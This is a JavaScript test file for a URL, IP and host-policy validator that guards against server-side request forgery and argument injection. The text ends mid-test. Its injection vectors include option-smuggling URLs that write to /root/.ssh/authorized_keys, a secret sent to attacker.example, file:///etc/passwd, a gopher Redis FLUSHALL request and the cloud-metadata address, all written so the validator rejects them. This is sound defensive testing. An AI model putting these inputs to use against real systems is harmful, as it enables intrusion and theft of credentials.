import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { writeFileSync, mkdtempSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { loadManifest } from "../src/manifest.js";
import {
  validateArg,
  validateArgWithCustomTypes,
  splitUrlScheme,
  parseUrlAuthority,
} from "../src/validator.js";
import { execute, executeHttp } from "../src/executor.js";
import {
  ALWAYS_BLOCKED_RANGES,
  BLOCK_INTERNAL_RANGES,
  parseIpv4,
  parseIpv6,
  parseCanonicalIp,
  parseCidr,
  ipInRange,
  toIpv4Mapped,
  alwaysBlockedIpReason,
  nonPublicIpReason,
  enforceIpPolicy,
  looksLikeIpLiteral,
  hasPunycodeLabel,
} from "../src/hostpolicy.js";

// Tests in this file never make a network request: every [http] manifest is
// run with dryRun and only the built request is inspected, and every exec
// manifest uses echo.

function writeTmp(content) {
  const dir = mkdtempSync(join(tmpdir(), "toolclad-w3-"));
  const path = join(dir, "test.clad.toml");
  writeFileSync(path, content);
  return path;
}

const ALWAYS_BLOCKED_V4 =
  /target is a link-local \/ cloud-metadata address \(169\.254\.0\.0\/16\) — always blocked/;
const ALWAYS_BLOCKED_V6 =
  /target is an IPv6 link-local address \(fe80::\/10\) — always blocked/;
const BLOCKED_BY_POLICY = /\(blocked by block_internal policy\)$/;

// ---------------------------------------------------------------------------
// hostpolicy: strict literal parsers
// ---------------------------------------------------------------------------

describe("hostpolicy - strict IPv4 parsing", () => {
  it("parses canonical dotted-quad to a 32-bit integer", () => {
    assert.equal(parseIpv4("1.2.3.4"), 0x01020304);
    assert.equal(parseIpv4("0.0.0.0"), 0);
    assert.equal(parseIpv4("255.255.255.255"), 0xffffffff);
    assert.equal(parseIpv4("127.0.0.1"), 0x7f000001);
  });

  it("rejects every non-canonical encoding a resolver would expand", () => {
    for (const v of [
      "01.2.3.4",
      "1.2.3.04",
      "0177.0.0.1",
      "256.1.1.1",
      "999.999.999.999",
      "1.2.3",
      "1.2.3.4.5",
      "2130706433",
      "0x7f000001",
      "127.1",
      "1.2.3.4 ",
      "",
    ]) {
      assert.equal(parseIpv4(v), null, v);
    }
  });
});

describe("hostpolicy - strict IPv6 parsing", () => {
  it("parses standard forms to eight 16-bit groups", () => {
    assert.deepEqual(parseIpv6("::1"), [0, 0, 0, 0, 0, 0, 0, 1]);
    assert.deepEqual(parseIpv6("::"), [0, 0, 0, 0, 0, 0, 0, 0]);
    assert.deepEqual(parseIpv6("1:2:3:4:5:6:7:8"), [1, 2, 3, 4, 5, 6, 7, 8]);
    assert.deepEqual(parseIpv6("1:2:3:4:5:6:7::"), [1, 2, 3, 4, 5, 6, 7, 0]);
    assert.deepEqual(parseIpv6("::1:2:3:4:5:6:7"), [0, 1, 2, 3, 4, 5, 6, 7]);
    assert.deepEqual(parseIpv6("FE80::ABCD"), [0xfe80, 0, 0, 0, 0, 0, 0, 0xabcd]);
    assert.deepEqual(
      parseIpv6("0000:0000:0000:0000:0000:0000:0000:0001"),
      [0, 0, 0, 0, 0, 0, 0, 1]
    );
  });

  it("accepts a dotted-quad IPv4 only as the closing groups", () => {
    assert.deepEqual(parseIpv6("::ffff:1.2.3.4"), [0, 0, 0, 0, 0, 0xffff, 0x0102, 0x0304]);
    assert.deepEqual(parseIpv6("::1.2.3.4"), [0, 0, 0, 0, 0, 0, 0x0102, 0x0304]);
    assert.deepEqual(parseIpv6("1:2:3:4:5:6:1.2.3.4"), [1, 2, 3, 4, 5, 6, 0x0102, 0x0304]);
    assert.equal(parseIpv6("1.2.3.4::"), null);
    assert.equal(parseIpv6("::ffff:01.2.3.4"), null);
    assert.equal(parseIpv6("::ffff:1.2.3"), null);
    assert.equal(parseIpv6("1:2:3:4:5:6:7:1.2.3.4"), null);
  });

  it("rejects malformed, bracketed, zoned and loose forms", () => {
    for (const v of [
      "1::2::3",
      "1:::2",
      "fe80::1%eth0",
      "00001::",
      "1:2:3:4:5:6:7:8:9",
      ":1:2:3:4:5:6:7",
      "1:2:3:4:5:6:7:",
      "1:2:3:4:5:6:7",
      "cafe",
      "[::1]",
      "",
    ]) {
      assert.equal(parseIpv6(v), null, v);
    }
  });

  it("parseCanonicalIp tags the family", () => {
    assert.deepEqual(parseCanonicalIp("10.0.0.5"), { family: 4, addr: 0x0a000005 });
    assert.deepEqual(parseCanonicalIp("::1"), { family: 6, groups: [0, 0, 0, 0, 0, 0, 0, 1] });
    assert.equal(parseCanonicalIp("cafe"), null);
    assert.equal(parseCanonicalIp("127.1"), null);
  });

  it("unwraps IPv4-mapped IPv6 and nothing else", () => {
    assert.deepEqual(toIpv4Mapped(parseCanonicalIp("::ffff:169.254.169.254")), {
      family: 4,
      addr: 0xa9fea9fe,
    });
    assert.equal(toIpv4Mapped(parseCanonicalIp("::169.254.169.254")), null);
    assert.equal(toIpv4Mapped(parseCanonicalIp("::1")), null);
  });
});

describe("hostpolicy - CIDR parsing and containment", () => {
  it("parses a canonical base with an in-bounds prefix", () => {
    assert.deepEqual(parseCidr("10.0.0.0/8"), { ip: { family: 4, addr: 0x0a000000 }, prefix: 8 });
    assert.equal(parseCidr("::/0").prefix, 0);
    assert.equal(parseCidr("2001:db8::/32").prefix, 32);
  });

  it("rejects a non-canonical base or an out-of-bounds prefix", () => {
    for (const v of ["10.0.0.0/33", "::/129", "0177.0.0.1/8", "10.0.0.0/", "10.0.0.0/x", "10.0.0.0", "127.1/8"]) {
      assert.equal(parseCidr(v), null, v);
    }
  });

  it("tests containment at every prefix boundary", () => {
    const inRange = (ip, cidr) => ipInRange(parseCanonicalIp(ip), parseCidr(cidr));
    assert.equal(inRange("172.31.255.255", "172.16.0.0/12"), true);
    assert.equal(inRange("172.32.0.0", "172.16.0.0/12"), false);
    assert.equal(inRange("172.15.255.255", "172.16.0.0/12"), false);
    assert.equal(inRange("100.127.255.255", "100.64.0.0/10"), true);
    assert.equal(inRange("100.128.0.0", "100.64.0.0/10"), false);
    assert.equal(inRange("198.19.255.255", "198.18.0.0/15"), true);
    assert.equal(inRange("198.20.0.0", "198.18.0.0/15"), false);
    assert.equal(inRange("255.255.255.255", "240.0.0.0/4"), true);
    assert.equal(inRange("239.255.255.255", "240.0.0.0/4"), false);
    assert.equal(inRange("8.8.8.8", "0.0.0.0/0"), true);
    assert.equal(inRange("fdff:ffff::1", "fc00::/7"), true);
    assert.equal(inRange("fe00::1", "fc00::/7"), false);
    assert.equal(inRange("febf:ffff::1", "fe80::/10"), true);
    assert.equal(inRange("fec0::1", "fe80::/10"), false);
    assert.equal(inRange("2001:db8:ffff:ffff::1", "2001:db8::/32"), true);
    assert.equal(inRange("2001:db9::1", "2001:db8::/32"), false);
    assert.equal(inRange("::1", "::1/128"), true);
    assert.equal(inRange("::2", "::1/128"), false);
    assert.equal(inRange("::1", "127.0.0.0/8"), false, "families never match");
  });
});

// ---------------------------------------------------------------------------
// hostpolicy: the range table and its wording
// ---------------------------------------------------------------------------

describe("hostpolicy - range table", () => {
  it("always-blocked rows are exactly the link-local ranges", () => {
    assert.deepEqual(
      ALWAYS_BLOCKED_RANGES.map(([cidr]) => cidr),
      ["169.254.0.0/16", "fe80::/10"]
    );
  });

  it("block_internal rows match the normative table, in order", () => {
    assert.deepEqual(
      BLOCK_INTERNAL_RANGES.map(([cidr]) => cidr),
      [
        "127.0.0.0/8",
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "100.64.0.0/10",
        "0.0.0.0/8",
        "255.255.255.255/32",
        "192.0.2.0/24",
        "198.51.100.0/24",
        "203.0.113.0/24",
        "198.18.0.0/15",
        "240.0.0.0/4",
        "::1/128",
        "::/128",
        "fc00::/7",
        "fe80::/10",
        "2001:db8::/32",
      ]
    );
  });

  it("always-blocked reasons, with and without the v4-mapped wrapper", () => {
    const reason = (ip) => alwaysBlockedIpReason(parseCanonicalIp(ip));
    assert.equal(
      reason("169.254.169.254"),
      "is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked"
    );
    assert.equal(
      reason("::ffff:169.254.169.254"),
      "is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked"
    );
    assert.equal(reason("fe80::1"), "is an IPv6 link-local address (fe80::/10) — always blocked");
    assert.equal(reason("127.0.0.1"), null);
    assert.equal(reason("::1"), null);
    assert.equal(reason("93.184.216.34"), null);
  });

  it("block_internal reasons use the shared wording", () => {
    const reason = (ip) => nonPublicIpReason(parseCanonicalIp(ip));
    assert.equal(reason("127.0.0.1"), "resolves to a loopback address");
    assert.equal(reason("127.255.255.255"), "resolves to a loopback address");
    assert.equal(reason("10.0.0.5"), "resolves to a private address");
    assert.equal(reason("172.16.0.1"), "resolves to a private address");
    assert.equal(reason("192.168.1.1"), "resolves to a private address");
    assert.equal(reason("100.64.0.1"), "resolves to a shared / carrier-grade NAT address (100.64.0.0/10)");
    assert.equal(reason("0.0.0.0"), "is in the unspecified range (0.0.0.0/8)");
    assert.equal(reason("0.1.2.3"), "is in the unspecified range (0.0.0.0/8)");
    assert.equal(reason("255.255.255.255"), "is the broadcast address");
    assert.equal(reason("192.0.2.1"), "is a documentation-range address");
    assert.equal(reason("198.51.100.1"), "is a documentation-range address");
    assert.equal(reason("203.0.113.1"), "is a documentation-range address");
    assert.equal(reason("198.18.0.1"), "is a benchmarking-range address (198.18.0.0/15)");
    assert.equal(reason("240.0.0.1"), "is a reserved address (240.0.0.0/4)");
    assert.equal(reason("::1"), "resolves to the IPv6 loopback ::1");
    assert.equal(reason("::"), "is the IPv6 unspecified address ::");
    assert.equal(reason("fc00::1"), "is an IPv6 unique-local address (fc00::/7)");
    assert.equal(reason("fd12:3456::1"), "is an IPv6 unique-local address (fc00::/7)");
    assert.equal(reason("fe80::1"), "is an IPv6 link-local address (fe80::/10)");
    assert.equal(reason("2001:db8::1"), "is an IPv6 documentation-range address (2001:db8::/32)");
    // v4-mapped forms are caught by the IPv4 rows.
    assert.equal(reason("::ffff:127.0.0.1"), "resolves to a loopback address");
    assert.equal(reason("::ffff:10.1.1.1"), "resolves to a private address");
    assert.equal(reason("::ffff:0.0.0.0"), "is in the unspecified range (0.0.0.0/8)");
    // Public addresses have no reason.
    assert.equal(reason("93.184.216.34"), null);
    assert.equal(reason("8.8.8.8"), null);
    assert.equal(reason("2606:2800:220:1:248:1893:25c8:1946"), null);
    assert.equal(reason("::ffff:93.184.216.34"), null);
  });

  it("enforceIpPolicy formats the two message shapes", () => {
    assert.throws(
      () => enforceIpPolicy(parseCanonicalIp("169.254.169.254"), false),
      /^Error: target is a link-local \/ cloud-metadata address \(169\.254\.0\.0\/16\) — always blocked$/
    );
    assert.throws(
      () => enforceIpPolicy(parseCanonicalIp("127.0.0.1"), true),
      /^Error: target resolves to a loopback address \(blocked by block_internal policy\)$/
    );
    assert.doesNotThrow(() => enforceIpPolicy(parseCanonicalIp("127.0.0.1"), false));
    assert.doesNotThrow(() => enforceIpPolicy(parseCanonicalIp("93.184.216.34"), true));
  });
});

describe("hostpolicy - literal and label helpers", () => {
  it("looksLikeIpLiteral flags hex, integer, octal and shorthand forms", () => {
    for (const v of ["2130706433", "0x7f000001", "0X7F000001", "0177.0.0.1", "127.1", "1.2.3.4.5", "999.999.999.999"]) {
      assert.equal(looksLikeIpLiteral(v), true, v);
    }
    for (const v of ["example.com", "1.example", "", "1..2", "a1"]) {
      assert.equal(looksLikeIpLiteral(v), false, v);
    }
  });

  it("hasPunycodeLabel is case-insensitive per label", () => {
    assert.equal(hasPunycodeLabel("xn--example-9c.com"), true);
    assert.equal(hasPunycodeLabel("sub.XN--example-9c.com"), true);
    assert.equal(hasPunycodeLabel("example.com"), false);
    assert.equal(hasPunycodeLabel("xn-.com"), false);
  });
});

// ---------------------------------------------------------------------------
// url validator (W3)
// ---------------------------------------------------------------------------

describe("validateArg - url: shared injection vectors", () => {
  // Inline copy of every `url-` vector from tests/injection_vectors.json;
  // the shared-suite wave replaces this list with the file.
  const VECTORS = [
    {
      id: "url-space-option-injection",
      arg: { type: "url" },
      value: "https://attacker.example/ -o /root/.ssh/authorized_keys",
      reject: /must not contain whitespace/,
    },
    {
      id: "url-space-write-tmp",
      arg: { type: "url" },
      value: "https://attacker.example/ -o /tmp/pwned",
      reject: /must not contain whitespace/,
    },
    {
      id: "url-secret-smuggling",
      arg: { type: "url" },
      value: "https://attacker.example/?k={_secret:api_key}",
      reject: /Injection detected/,
    },
    {
      id: "url-javascript-scheme",
      arg: { type: "url" },
      value: "javascript:alert(1)",
      reject: /Injection detected|Invalid URL/,
    },
    {
      id: "url-file-scheme",
      arg: { type: "url" },
      value: "file:///etc/passwd",
      reject: /URL scheme "file" not in allowed schemes: \[http, https\]/,
    },
    {
      id: "url-data-scheme",
      arg: { type: "url" },
      value: "data:text/html,<script>1</script>",
      reject: /Injection detected/,
    },
    {
      id: "url-gopher-redis",
      arg: { type: "url" },
      value: "gopher://127.0.0.1:6379/_FLUSHALL",
      reject: /URL scheme "gopher" not in allowed schemes/,
    },
    {
      id: "url-dict-scheme",
      arg: { type: "url" },
      value: "dict://127.0.0.1:11211/stat",
      reject: /URL scheme "dict" not in allowed schemes/,
    },
    {
      id: "url-userinfo",
      arg: { type: "url" },
      value: "http://user:pw@example.com/",
      reject: /URL must not contain userinfo/,
    },
    {
      id: "url-metacharacter",
      arg: { type: "url" },
      value: "https://attacker.example/;id",
      reject: /Injection detected/,
    },
    {
      id: "url-scheme-not-in-list",
      arg: { type: "url", schemes: ["https"] },
      value: "http://example.com/",
      reject: /URL scheme "http" not in allowed schemes: \[https\]/,
    },
    {
      id: "url-imds-always-blocked",
      arg: { type: "url" },
      value: "http://169.254.169.254/latest/meta-data/",
      reject: ALWAYS_BLOCKED_V4,
    },
    {
      id: "url-docker-socket-block-internal",
      arg: { type: "url", block_internal: true },
      value: "http://127.0.0.1:2375/containers/json",
      reject: /target resolves to a loopback address \(blocked by block_internal policy\)/,
    },
    {
      // The metacharacter blocklist contains `[` and `]` in every runtime,
      // so a bracketed literal never reaches the host policy.
      id: "url-ipv6-loopback-block-internal",
      arg: { type: "url", block_internal: true },
      value: "http://[::1]:8080/",
      reject: /Injection detected/,
    },
    { id: "url-accept", arg: { type: "url" }, value: "https://example.com/path" },
    {
      id: "url-accept-public-ip-block-internal",
      arg: { type: "url", block_internal: true },
      value: "https://93.184.216.34/x",
    },
  ];

  for (const v of VECTORS) {
    it(v.id, () => {
      if (v.reject) {
        assert.throws(() => validateArg(v.arg, v.value), v.reject);
      } else {
        assert.equal(validateArg(v.arg, v.value), v.value);
      }
    });
  }
});

describe("validateArg - url: structure", () => {
  it("requires scheme://", () => {
    assert.throws(() => validateArg({ type: "url" }, "example.com/path"), /Invalid URL/);
    assert.throws(() => validateArg({ type: "url" }, "mailto:root"), /Invalid URL/);
    assert.throws(() => validateArg({ type: "url" }, "https:/example.com"), /Invalid URL/);
  });

  it("scheme allowlist is case-insensitive and defaults to http/https", () => {
    assert.equal(validateArg({ type: "url" }, "HTTPS://example.com/"), "HTTPS://example.com/");
    assert.equal(validateArg({ type: "url", schemes: [] }, "http://example.com/"), "http://example.com/");
    assert.equal(validateArg({ type: "url", schemes: ["HTTPS"] }, "https://example.com/"), "https://example.com/");
    assert.throws(
      () => validateArg({ type: "url", schemes: [] }, "ssh://example.com/"),
      /URL scheme "ssh" not in allowed schemes: \[http, https\]/
    );
    assert.equal(
      validateArg({ type: "url", schemes: ["ssh", "https"] }, "ssh://example.com/"),
      "ssh://example.com/"
    );
  });

  it("denied schemes stay denied even when a manifest lists them", () => {
    for (const [scheme, value] of [
      ["ftp", "ftp://example.com/pub"],
      ["gopher", "gopher://example.com/"],
      ["file", "file://example.com/etc/passwd"],
      ["ldap", "ldap://example.com/"],
      ["ws", "ws://example.com/socket"],
      ["wss", "wss://example.com/socket"],
    ]) {
      assert.throws(
        () => validateArg({ type: "url", schemes: [scheme, "https"] }, value),
        new RegExp(`URL scheme "${scheme}" is never allowed`),
        value
      );
    }
    // The denial is also case-insensitive on both sides.
    assert.throws(
      () => validateArg({ type: "url", schemes: ["FTP"] }, "FTP://example.com/"),
      /URL scheme "ftp" is never allowed/
    );
  });

  it("rejects userinfo in any position of the authority", () => {
    assert.throws(
      () => validateArg({ type: "url" }, "https://example.com@evil.example/"),
      /URL must not contain userinfo/
    );
    assert.throws(
      () => validateArg({ type: "url" }, "https://admin@example.com:8443/"),
      /URL must not contain userinfo/
    );
  });

  it("rejects an empty host", () => {
    for (const v of ["https://", "https:///x", "https://?q=1", "https://:8443/"]) {
      assert.throws(() => validateArg({ type: "url" }, v), /URL host must not be empty/, v);
    }
  });

  it("accepts an explicit port in range and rejects one out of range", () => {
    assert.equal(validateArg({ type: "url" }, "https://example.com:8443/x"), "https://example.com:8443/x");
    assert.equal(validateArg({ type: "url" }, "https://example.com:65535"), "https://example.com:65535");
    for (const v of [
      "https://example.com:0/x",
      "https://example.com:99999/x",
      "https://example.com:65536/",
      "https://example.com:/x",
      "https://example.com:8a/x",
      "https://example.com:-1/x",
    ]) {
      assert.throws(() => validateArg({ type: "url" }, v), /URL port must be 1-65535/, v);
    }
  });

  it("accepts a host without a path and with a query", () => {
    assert.equal(validateArg({ type: "url" }, "https://example.com"), "https://example.com");
    assert.equal(validateArg({ type: "url" }, "https://example.com?q=1"), "https://example.com?q=1");
    assert.equal(
      validateArg({ type: "url" }, "https://sub.example.com:8080/a/b?c=d"),
      "https://sub.example.com:8080/a/b?c=d"
    );
    // `&` and `#` are shell metacharacters, so a multi-pair query or a
    // fragment never reaches the structural parse.
    assert.throws(
      () => validateArg({ type: "url" }, "https://sub.example.com/a?c=d&e=f"),
      /Injection detected/
    );
  });

  it("rejects non-canonical IP literal hosts instead of resolving them", () => {
    for (const v of ["http://0x7f000001/", "http://2130706433/", "http://0177.0.0.1/", "http://127.1/", "http://169.254.169.254.0/"]) {
      assert.throws(
        () => validateArg({ type: "url" }, v),
        /URL host looks like a non-canonical IP literal/,
        v
      );
    }
  });

  it("rejects punycode and malformed hostnames", () => {
    assert.throws(
      () => validateArg({ type: "url" }, "https://xn--example-9c.com/"),
      /URL host must not contain punycode \(xn--\) labels/
    );
    for (const v of ["https://exa_mple.com/", "https://-bad.example/", "https://bad-.example/", "https://exa%6dple.com/", "https://exаmple.com/"]) {
      assert.throws(() => validateArg({ type: "url" }, v), /URL host is not a valid hostname or IP literal/, v);
    }
  });

  it("returns the value untouched — no WHATWG normalization", () => {
    const v = "HTTPS://Example.COM:8443/Path/../x?Q=1";
    assert.equal(validateArg({ type: "url" }, v), v);
  });
});

describe("validateArg - url: host policy", () => {
  it("link-local is blocked with block_internal on and off", () => {
    for (const blockInternal of [true, false]) {
      assert.throws(
        () => validateArg({ type: "url", block_internal: blockInternal }, "http://169.254.169.254/latest/meta-data/"),
        ALWAYS_BLOCKED_V4
      );
      assert.throws(
        () => validateArg({ type: "url", block_internal: blockInternal }, "http://169.254.1.1:80/"),
        ALWAYS_BLOCKED_V4
      );
    }
  });

  it("the IPv4-mapped IMDS spelling is refused on a url in both modes", () => {
    for (const blockInternal of [true, false]) {
      assert.throws(
        () => validateArg({ type: "url", block_internal: blockInternal }, "http://[::ffff:169.254.169.254]/latest/"),
        /Injection detected/
      );
    }
  });

  it("block_internal rejects loopback and private literals", () => {
    const def = { type: "url", block_internal: true };
    assert.throws(() => validateArg(def, "http://127.0.0.1/"), /target resolves to a loopback address \(blocked by block_internal policy\)/);
    assert.throws(() => validateArg(def, "http://10.0.0.5:8080/admin"), /target resolves to a private address \(blocked by block_internal policy\)/);
    assert.throws(() => validateArg(def, "http://192.168.1.1/"), BLOCKED_BY_POLICY);
    assert.throws(() => validateArg(def, "http://100.64.0.1/"), BLOCKED_BY_POLICY);
    assert.throws(() => validateArg(def, "http://0.0.0.0/"), BLOCKED_BY_POLICY);
    assert.throws(() => validateArg(def, "http://198.18.0.1/"), BLOCKED_BY_POLICY);
    assert.equal(validateArg(def, "https://93.184.216.34/x"), "https://93.184.216.34/x");
    assert.equal(validateArg(def, "https://example.com/"), "https://example.com/");
  });

  it("block_internal is opt-in: loopback passes without it", () => {
    assert.equal(validateArg({ type: "url" }, "http://127.0.0.1:8080/"), "http://127.0.0.1:8080/");
    assert.equal(validateArg({ type: "url", block_internal: false }, "http://10.0.0.5/"), "http://10.0.0.5/");
  });

  it("a custom type with base url carries block_internal", () => {
    const types = { web: { base: "url" } };
    assert.throws(
      () => validateArgWithCustomTypes({ type: "web", block_internal: true }, "http://127.0.0.1/", types),
      BLOCKED_BY_POLICY
    );
    assert.equal(
      validateArgWithCustomTypes({ type: "web", block_internal: true }, "https://93.184.216.34/", types),
      "https://93.184.216.34/"
    );
  });
});

describe("url structural helpers", () => {
  it("splitUrlScheme lowercases the scheme only", () => {
    assert.deepEqual(splitUrlScheme("HTTPS://Example.com/P"), { scheme: "https", rest: "Example.com/P" });
    assert.throws(() => splitUrlScheme("javascript:alert(1)"), /Invalid URL/);
  });

  it("parseUrlAuthority unwraps a bracketed IPv6 literal and splits the port", () => {
    assert.deepEqual(parseUrlAuthority("[::1]:8080/"), { host: "::1", port: 8080, bracketed: true });
    assert.deepEqual(parseUrlAuthority("[fe80::1]"), { host: "fe80::1", port: null, bracketed: true });
    assert.deepEqual(parseUrlAuthority("[::ffff:169.254.169.254]/x"), {
      host: "::ffff:169.254.169.254",
      port: null,
      bracketed: true,
    });
    assert.deepEqual(parseUrlAuthority("example.com:8443/p?q#f"), { host: "example.com", port: 8443, bracketed: false });
    assert.deepEqual(parseUrlAuthority("example.com?x=a@b"), { host: "example.com", port: null, bracketed: false });
    assert.deepEqual(parseUrlAuthority("example.com#a@b"), { host: "example.com", port: null, bracketed: false });
  });

  it("parseUrlAuthority refuses malformed brackets, userinfo and bad ports", () => {
    assert.throws(() => parseUrlAuthority("[::1"), /unterminated IPv6 bracket/);
    assert.throws(() => parseUrlAuthority("[cafe]/"), /not a canonical IPv6 literal/);
    assert.throws(() => parseUrlAuthority("[::1]x/"), /Invalid URL authority/);
    assert.throws(() => parseUrlAuthority("[::1]:0/"), /URL port must be 1-65535/);
    assert.throws(() => parseUrlAuthority("[::1]:/"), /URL port must be 1-65535/);
    assert.throws(() => parseUrlAuthority("user:pw@example.com/"), /userinfo/);
    assert.throws(() => parseUrlAuthority("example.com@evil.example/"), /userinfo/);
    assert.throws(() => parseUrlAuthority("fe80::1/"), /URL port must be 1-65535/);
    assert.throws(() => parseUrlAuthority("/path"), /URL host must not be empty/);
  });

  it("the unwrapped bracket host goes through the same policy", () => {
    const { host } = parseUrlAuthority("[::1]:8080/");
    assert.throws(() => enforceIpPolicy(parseCanonicalIp(host), true), BLOCKED_BY_POLICY);
    const imds = parseUrlAuthority("[::ffff:169.254.169.254]/").host;
    assert.throws(() => enforceIpPolicy(parseCanonicalIp(imds), false), ALWAYS_BLOCKED_V4);
  });
});

// ---------------------------------------------------------------------------
// scope_target, ip_address, cidr
// ---------------------------------------------------------------------------

describe("validateArg - scope_target: strict literals and policy", () => {
  it("block_internal rejects the non-public literals", () => {
    const def = { type: "scope_target", block_internal: true };
    assert.throws(() => validateArg(def, "10.0.0.5"), /target resolves to a private address \(blocked by block_internal policy\)/);
    assert.throws(() => validateArg(def, "192.168.1.1"), /target resolves to a private address \(blocked by block_internal policy\)/);
    assert.throws(() => validateArg(def, "0.0.0.0"), /target is in the unspecified range \(0\.0\.0\.0\/8\) \(blocked by block_internal policy\)/);
    assert.throws(() => validateArg(def, "::1"), /target resolves to the IPv6 loopback ::1 \(blocked by block_internal policy\)/);
    assert.throws(() => validateArg(def, "fc00::1"), /target is an IPv6 unique-local address \(fc00::\/7\) \(blocked by block_internal policy\)/);
    assert.throws(() => validateArg(def, "::ffff:127.0.0.1"), /target resolves to a loopback address \(blocked by block_internal policy\)/);
    assert.equal(validateArg(def, "93.184.216.34"), "93.184.216.34");
    assert.equal(validateArg(def, "2606:2800:220:1:248:1893:25c8:1946"), "2606:2800:220:1:248:1893:25c8:1946");
  });

  it("block_internal is opt-in for scope_target", () => {
    assert.equal(validateArg({ type: "scope_target" }, "10.0.0.5"), "10.0.0.5");
    assert.equal(validateArg({ type: "scope_target" }, "::1"), "::1");
  });

  it("link-local is always blocked, in both address families and the mapped form", () => {
    for (const blockInternal of [true, false]) {
      const def = { type: "scope_target", block_internal: blockInternal };
      assert.throws(() => validateArg(def, "169.254.169.254"), ALWAYS_BLOCKED_V4);
      assert.throws(() => validateArg(def, "::ffff:169.254.169.254"), ALWAYS_BLOCKED_V4);
      assert.throws(() => validateArg(def, "fe80::1"), ALWAYS_BLOCKED_V6);
    }
  });

  it("rejects non-canonical IP literals instead of passing them as hostnames", () => {
    for (const v of ["999.999.999.999", "0177.0.0.1", "2130706433", "0x7f000001", "127.1", "01.2.3.4", "1.2.3.4.5"]) {
      assert.throws(
        () => validateArg({ type: "scope_target" }, v),
        /scope_target looks like a non-canonical IP literal; use dotted-quad IPv4 or standard IPv6/,
        v
      );
    }
  });

  it("a hex-looking word is a hostname, not an IPv6 literal", () => {
    assert.equal(validateArg({ type: "scope_target" }, "cafe"), "cafe");
    assert.equal(validateArg({ type: "scope_target" }, "cafe::1"), "cafe::1");
    assert.throws(() => validateArg({ type: "scope_target" }, "cafe:1"), /Invalid scope_target/);
    assert.throws(() => validateArg({ type: "scope_target" }, "1:2:3:4:5:6:7:8:9"), /Invalid scope_target/);
  });

  it("CIDR base addresses are range-checked under policy", () => {
    assert.equal(validateArg({ type: "scope_target" }, "10.0.0.0/8"), "10.0.0.0/8");
    assert.throws(() => validateArg({ type: "scope_target", block_internal: true }, "10.0.0.0/8"), BLOCKED_BY_POLICY);
    assert.throws(() => validateArg({ type: "scope_target", block_internal: true }, "fc00::/7"), BLOCKED_BY_POLICY);
    assert.throws(() => validateArg({ type: "scope_target", block_internal: true }, "2001:db8::/32"), BLOCKED_BY_POLICY);
    assert.throws(() => validateArg({ type: "scope_target" }, "169.254.0.0/16"), ALWAYS_BLOCKED_V4);
    assert.equal(validateArg({ type: "scope_target", block_internal: true }, "93.184.216.0/24"), "93.184.216.0/24");
  });

  it("CIDR shapes are parsed strictly", () => {
    for (const v of ["999.0.0.0/8", "10.0.0.0/33", "0177.0.0.1/8", "::/129", "127.1/8"]) {
      assert.throws(() => validateArg({ type: "scope_target" }, v), /Invalid scope_target/, v);
    }
    assert.throws(() => validateArg({ type: "scope_target" }, "example.com/24"), /must not contain '\/'/);
  });

  it("rejects a DNS label over 63 octets and a numeric TLD", () => {
    assert.throws(
      () => validateArg({ type: "scope_target" }, `${"a".repeat(64)}.example.com`),
      /DNS label exceeding 63 octets/
    );
    assert.equal(
      validateArg({ type: "scope_target" }, `${"a".repeat(63)}.example.com`),
      `${"a".repeat(63)}.example.com`
    );
    assert.throws(() => validateArg({ type: "scope_target" }, "example.123"), /Invalid scope_target/);
  });
});

describe("validateArg - ip_address and cidr: policy", () => {
  it("ip_address applies the always-blocked and block_internal tables", () => {
    assert.throws(() => validateArg({ type: "ip_address" }, "169.254.169.254"), ALWAYS_BLOCKED_V4);
    assert.throws(() => validateArg({ type: "ip_address" }, "::ffff:169.254.169.254"), ALWAYS_BLOCKED_V4);
    assert.throws(() => validateArg({ type: "ip_address", block_internal: true }, "127.0.0.1"), BLOCKED_BY_POLICY);
    assert.throws(() => validateArg({ type: "ip_address", block_internal: true }, "::1"), BLOCKED_BY_POLICY);
    assert.equal(validateArg({ type: "ip_address" }, "127.0.0.1"), "127.0.0.1");
    assert.equal(validateArg({ type: "ip_address", block_internal: true }, "93.184.216.34"), "93.184.216.34");
  });

  it("ip_address accepts only canonical literals", () => {
    assert.throws(() => validateArg({ type: "ip_address" }, "01.2.3.4"), /Invalid IPv4 address/);
    assert.throws(() => validateArg({ type: "ip_address" }, "0177.0.0.1"), /Invalid IPv4 address/);
    assert.throws(() => validateArg({ type: "ip_address" }, "127.1"), /Invalid IPv4 address/);
    assert.throws(() => validateArg({ type: "ip_address" }, "0x7f000001"), /Invalid IP address/);
    assert.throws(() => validateArg({ type: "ip_address" }, "cafe"), /Invalid IP address/);
    assert.throws(() => validateArg({ type: "ip_address" }, "fe80::1%eth0"), /Invalid IP address/);
  });

  it("cidr applies the policy to the base address and parses strictly", () => {
    assert.throws(() => validateArg({ type: "cidr" }, "169.254.0.0/16"), ALWAYS_BLOCKED_V4);
    assert.throws(() => validateArg({ type: "cidr", block_internal: true }, "127.0.0.0/8"), BLOCKED_BY_POLICY);
    assert.throws(() => validateArg({ type: "cidr", block_internal: true }, "::1/128"), BLOCKED_BY_POLICY);
    assert.throws(() => validateArg({ type: "cidr", block_internal: true }, "2001:db8::/32"), BLOCKED_BY_POLICY);
    assert.equal(validateArg({ type: "cidr", block_internal: true }, "93.184.216.0/24"), "93.184.216.0/24");
    assert.equal(validateArg({ type: "cidr" }, "2001:db8::/32"), "2001:db8::/32");
    assert.throws(() => validateArg({ type: "cidr" }, "0177.0.0.1/8"), /Invalid CIDR notation/);
    assert.throws(() => validateArg({ type: "cidr" }, "999.0.0.0/8"), /Invalid CIDR notation/);
    assert.throws(() => validateArg({ type: "cidr" }, "::/129"), /Invalid CIDR prefix for IPv6/);
  });
});

// ---------------------------------------------------------------------------
// manifest: block_internal is a real field
// ---------------------------------------------------------------------------

describe("manifest - block_internal and schemes", () => {
  const HEAD = `
[tool]
name = "t"
description = "t"
binary = "echo"
`;
  const TAIL = `
[command]
exec = ["echo", "{target}"]

[output]
format = "text"
`;

  it("defaults block_internal to false and reads an explicit true", () => {
    const off = loadManifest(writeTmp(`${HEAD}
[args.target]
type = "scope_target"
required = true
description = "t"
${TAIL}`));
    assert.equal(off.args.target.block_internal, false);

    const on = loadManifest(writeTmp(`${HEAD}
[args.target]
type = "scope_target"
required = true
description = "t"
block_internal = true
${TAIL}`));
